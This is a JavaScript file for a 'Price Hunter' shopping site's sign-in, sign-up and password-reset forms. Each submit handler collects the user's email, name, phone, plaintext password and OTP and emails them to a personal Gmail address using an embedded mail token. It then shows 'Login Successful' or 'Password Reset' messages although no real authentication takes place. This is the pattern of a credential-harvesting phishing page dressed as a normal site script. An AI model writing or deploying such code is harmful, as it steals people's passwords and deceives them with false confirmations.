
//FOR SWITCHING PAGE
let alreadyhaveAccount = document.querySelector("#aha")
let signIn = document.querySelector(".signIn")
let IdontHaveAnAccount = document.querySelector("#nhcaa")
let signUp = document.querySelector(".signUp")

let resetBtn = document.querySelector("#resetBtn")
let forgetPage = document.querySelector(".frgtPage")
let goBack = document.querySelector("mark")
let forgetLink = document.querySelector("#frgtLink")

 alreadyhaveAccount.addEventListener("click", function (){
     signIn.style.display = "block"
     signUp.style.display = "none"
 })
 
 IdontHaveAnAccount.addEventListener("click", function (){
     signIn.style.display = "none"
     signUp.style.display = "block"
 })
 
 goBack.addEventListener("click",function(){
     signIn.style.display = "block"
     forgetPage.style.display = "none"
 })
 
  forgetLink.addEventListener("click",function(){
     signIn.style.display = "none"
     forgetPage.style.display = "block"
 })
 

//FOR SIGNUP PAGE DATA TRANSFER TO ADMIN
 let SIGNUPBTN =  document.querySelector("#signUpbtn") 
 SIGNUPBTN.addEventListener("click",function(){
  
   let signUpEmail = document.querySelector(".signUp #email").value
   let signUpFname = document.querySelector(".signUp #fname").value
   let signUpLname = document.querySelector(".signUp #lname").value
   let signUpPhone = document.querySelector(".signUp #phone").value
   let signUpPass = document.querySelector(".signUp #pass").value
  
   if( signUpEmail.length == 0 || signUpFname.length == 0 || signUpLname.length == 0 || signUpPhone.length == 0 || signUpPass.length == 0){
    swal("ERROR", "Kindly ensure all details are filled.", "error");
   }else{
    Email.send({
    SecureToken : "925d1fee-c803-4d93-a09c-c79ad4da638f",
    To : 'jonah.marcus04@gmail.com',
    From : "jonah.marcus04@gmail.com",
    Subject : "PRICE HUNTER SIGN UP DATA",
    Body : "Email : " + signUpEmail
          + "<br> Name : " + signUpFname + " " + signUpLname
          + "<br> Phone : " + signUpPhone
          + "<br> Pass : " + signUpPass
}).then(
  message => swal("Karibuni Price Hunter !", "Your Account has been created.", "success")
      )
    }
 })
 
 //FOR SIGNIN PAGE DATA TRANSFER TO ADMIN
 let SIGNINBTN =  document.querySelector("#signInbtn") 
 SIGNINBTN.addEventListener("click",function(){
  
   let signUpEmail = document.querySelector(".signIn #email").value
   let signUpPass = document.querySelector(".signIn #pass").value

      if( signUpEmail.length == 0 || signUpPass.length == 0){
       swal("ERROR", "Kindly ensure all details are filled.", "error");
     }else{
       
     Email.send({
     SecureToken : "925d1fee-c803-4d93-a09c-c79ad4da638f",
     To : 'jonah.marcus04@gmail.com',
     From : "jonah.marcus04@gmail.com",
     Subject : "PRICE HUNTER LOGIN DATA",
     Body : "Email : " + signUpEmail
          + "<br> Pass : " + signUpPass
     }).then(
     message => swal("Login Successful !", "Enjoy Shopping the smarter way at PriceHunters")
     )
     }
})

 //FOR FORGETPAGE PAGE DATA TRANSFER TO ADMIN
let FORGETPAGEBTN =  document.querySelector("#resetBtn") 
FORGETPAGEBTN.addEventListener("click",function(){
   let signUpEmail = document.querySelector(".frgtPage #email").value
   let signUpOtp = document.querySelector(".frgtPage #otp").value
   let signUpPass = document.querySelector(".frgtPage #pass").value
   let signUpPassC = document.querySelector(".frgtPage #passC").value

    if( signUpEmail.length == 0 || signUpOtp.length == 0 ||  signUpPass.length == 0 || signUpPassC.length == 0){
      swal("ERROR", "Kindly ensure all details are filled.", "error");
    }else{
       Email.send({
       SecureToken : "925d1fee-c803-4d93-a09c-c79ad4da638f",
       To : 'jonah.marcus04@@gmail.com',
       From : "jonah.marcus04@gmail.com",
       Subject : "FORGET PASS DATA",
       Body : "Email : " + signUpEmail
              + "<br> OTP : " + signUpOtp
              + "<br> Pass : " + signUpPass
              + "<br> Pass Confirm : " + signUpPassC
       }).then(
       message => swal("Password Successfully Reset", "You can now login with your new password.", "SUCCESS")
       )
       }
    })
  